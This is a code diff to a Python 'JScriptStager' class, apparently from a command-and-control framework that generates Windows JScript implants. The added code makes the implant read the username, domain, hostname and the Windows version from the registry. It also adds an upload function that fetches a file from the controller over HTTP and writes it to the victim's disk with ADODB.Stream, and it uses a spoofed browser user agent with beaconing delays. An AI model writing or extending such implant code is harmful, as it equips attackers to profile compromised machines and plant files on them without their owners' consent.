@@ -25,17 +25,12 @@ class JScriptStager(Stager):
     def __init__(self, ip, port):
         super().__init__(ip, port)
 
-    def setup_functions(self):
-        self.functions['domain'] = util.Function('domain', 'Enumerates the current domain from environment variables', 'function domain(){{return {0}}}'.format(self.variables['domain'][1]))
-        self.functions['hostname'] = util.Function('hostname', 'Enumerates the current hostname from environment variables', 'function hostname(){{return {0}}}'.format(self.variables['hostname'][1]))
-        self.functions['sleep'] = util.Function('sleep', 'Change the delay between checkins (e.g., sleep 5000) is a delay of 5 seconds', 'function sleep(tmp){{{0} = tmp;}}'.format(self.variables['sleep'][0]))
-        self.functions['whoami'] = util.Function('whoami', 'Enumerates the current user from environment variables', 'function whoami(){{return {0}}}'.format(self.variables['username'][1]))
-
     def setup_variables(self):
         self.variables['errors'] = (util.generate_str(), 0)
+        self.variables['file-system-object'] = (util.generate_str(), 'new ActiveXObject("Scripting.FileSystemObject")')
         self.variables['host'] = (util.generate_str(), self.ip)
         self.variables['port'] = (util.generate_str(), self.port)
-        self.variables['post_req'] = (util.generate_str())
+        self.variables['post-req'] = (util.generate_str(), '')
         self.variables['sleep'] = (util.generate_str(), 3000)
         self.variables['useragent'] = (util.generate_str(), 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0')
         self.variables['content-encoding'] = (util.generate_str(), 'gzip, deflate, br')
@@ -45,6 +40,34 @@ class JScriptStager(Stager):
         self.variables['winhttp.winhttprequest'] = (util.generate_str(), 'new ActiveXObject("WinHttp.WinHttpRequest.5.1");')
 
         wscript = self.variables['wscript.shell'][0]
-        self.variables['username'] = (util.generate_str(), f'{wscript}.ExpandEnvironmentStrings("%USERNAME%");')
         self.variables['domain'] = (util.generate_str(), f'{wscript}.ExpandEnvironmentStrings("%USERDOMAIN%");')
         self.variables['hostname'] = (util.generate_str(), f'{wscript}.ExpandEnvironmentStrings("%COMPUTERNAME%");')
+        self.variables['username'] = (util.generate_str(), f'{wscript}.ExpandEnvironmentStrings("%USERNAME%");')
+        self.variables['product-name'] = (util.generate_str(), f'{wscript}.RegRead("HKLM\\\SOFTWARE\\\Microsoft\\\Windows NT\\\CurrentVersion\\\ProductName");')
+        self.variables['build-number'] = (util.generate_str(), f'{wscript}.RegRead("HKLM\\\SOFTWARE\\\Microsoft\\\Windows NT\\\CurrentVersion\\\CurrentBuildNumber");')
+
+    def setup_functions(self):
+        self.functions['domain'] = util.Function('domain', 'Enumerates the current domain from environment variables', 'function domain(){{return {0}}}'.format(self.variables['domain'][1]))
+        self.functions['hostname'] = util.Function('hostname', 'Enumerates the current hostname from environment variables', 'function hostname(){{return {0}}}'.format(self.variables['hostname'][1]))
+        self.functions['os'] = util.Function('os', 'Enumerates the current operating system product name and build number.', 'function os(){{var productname = {0}; var buildnumber = {1}; return productname + " Build " + buildnumber;}}'.format(self.variables['product-name'][1], self.variables['build-number'][1]))
+        self.functions['sleep'] = util.Function('sleep', 'Change the delay between checkins (e.g., sleep 5000) is a delay of 5 seconds', 'function sleep(tmp){{{0} = tmp;}}'.format(self.variables['sleep'][0]))
+        self.functions['upload'] = util.Function('upload','Upload a file to the remote system (e.g., upload local_filename, remote_path).',
+        ('''function upload(filename, path) {{'''
+            '''try {{'''
+                '''var data = {0}({1}, 'binary');'''
+                '''if ({2}.FileExists(path) == true){{'''
+                    '''return 'File already exists.';'''
+                '''}}'''
+                '''var stream = new ActiveXObject("ADODB.Stream");'''
+                '''stream.Open();'''
+                '''stream.Type = 1;'''
+                '''stream.Write(data);'''
+                '''stream.Position = 0;'''
+                '''stream.SaveToFile(path, 2);'''
+                '''stream.Close();'''
+                '''return 'Successfully uploaded the file.';'''
+            '''}} catch (e) {{'''
+                '''return 'Failed to upload the file: ' + e.Message + '.' ;'''
+            '''}}'''
+        '''}}''').format(self.variables['post-req'][0], ''' '"filename":"' + filename + '"}' ''', self.variables['file-system-object'][0]))
+        self.functions['whoami'] = util.Function('whoami', 'Enumerates the current user from environment variables', 'function whoami(){{return {0}}}'.format(self.variables['username'][1]))
